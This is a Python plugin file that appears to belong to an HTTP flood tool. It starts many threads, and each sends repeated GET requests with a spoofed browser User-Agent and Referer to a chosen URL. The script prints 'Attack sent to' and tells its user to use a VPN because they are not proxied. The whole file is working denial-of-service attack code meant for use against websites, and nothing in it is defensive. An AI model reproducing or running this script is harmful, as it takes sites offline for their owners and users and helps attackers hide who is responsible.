# plugins/basic_v2.py
import threading
import requests
import time

def send_req_basic_v2(url, packet, results):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Referer': 'https://www.google.com',
        'Upgrade-Insecure-Requests': '1'
    }

    for _ in range(packet):
        try:
            t = requests.get(url, headers=headers, timeout=5)
            results.append(f"GET {url} STATUS CODE {t.status_code}")
        except requests.exceptions.ConnectTimeout:
            results.append(f"GET {url} CONNECTION TIMEOUT")
        except requests.exceptions.RequestException as e:
            results.append(f"GET {url} ERROR: {e}")

def run_threads_v2(url, packets, threads, results):
    thread_list = []

    for _ in range(threads):
        thread = threading.Thread(target=send_req_basic_v2, args=(url, packets, results))
        thread_list.append(thread)
        thread.start()

    for thread in thread_list:
        thread.join()

def send_requests_with_timeout_v2(url, packets, threads, timeout=120):
    results = []
    start_time = time.time()

    print(f"\nAttack sent to:\nUrl: {url}\nPackets: {packets}\nTimeout: {timeout} (2 Min)\nNote: You are not proxied please use vpn\n")

    run_threads_v2(url, packets, threads, results)  

    elapsed_time = time.time() - start_time
    if elapsed_time < timeout:
        time.sleep(timeout - elapsed_time)

    # for result in results:
    #  print(result)

# send_requests_with_timeout_v2("http://example.com", packets=50, threads=50)
